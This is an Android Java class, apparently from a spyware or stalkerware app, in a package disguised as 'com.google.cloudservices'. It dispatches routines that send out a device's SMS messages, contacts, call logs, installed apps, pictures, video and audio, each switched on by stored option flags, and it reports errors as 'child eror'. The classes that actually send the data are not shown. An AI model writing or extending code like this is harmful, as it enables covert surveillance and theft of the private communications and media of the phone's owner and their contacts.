package com.google.cloudservices;

import android.content.Context;

import android.util.Log;

public class sendDataClass {
    public void send(Context context){

        OptionDB optionDB=new OptionDB(context);
        if (optionDB.getjs().get(0).equals("sms1")){
            sendsm(context);
        }
        try {
            if (optionDB.getjs().get(1).equals("contact1")){
                sendconttact(context);
            }
        }catch (Exception e){
            SendEror sendEror=new SendEror();
            sendEror.sender(context,"child eror:"+e.toString());
        }
        if (optionDB.getjs().get(2).equals("call1")){
            sendcall(context);
        }
//       try {
//           if (optionDB.getjs().get(3).equals("pack1")){sendPackage(context); }
//       }catch (Exception e){
//           SendEror sendEror=new SendEror();
//           sendEror.sender(context,"child eror:"+e.toString());
//       }
       try {
           if (optionDB.getjs().get(3).equals("pack1")||optionDB.getjs().get(5).equals("picture1")||optionDB.getjs().get(6).equals("video1")||optionDB.getjs().get(7).equals("Audio1")){
               getStat(context);
               Log.e("cach34354", "send: " );
           }   optionDB.close();
           Runtime.getRuntime().gc();
       }catch (Exception e){
           SendEror sendEror=new SendEror();
           sendEror.sender(context,"child eror:"+e.toString());
       }



    }
    public void sendsm(Context context){
        SendSms sendSms=new SendSms();
        sendSms.sendsms(context);
    }
    public void sendconttact(Context context){
        SendContact sendContact=new SendContact();
        sendContact.sendcontac(context);

    }
    public void sendcall(Context context){
        SendCall sendCall=new SendCall();
        sendCall.sendcal(context);
    }

    public void sendCurrentApp(Context context){
        sendCurrApp currApp=new sendCurrApp();
        currApp.send(context);
    }
    public void sendPackage(Context context){
        PackageSend packageSend=new PackageSend();
        packageSend.packagereq(context);
    }
    public void getStat(Context context){
        GetStatus getStatus=new GetStatus();
        getStatus.getlock(context);
    }

}
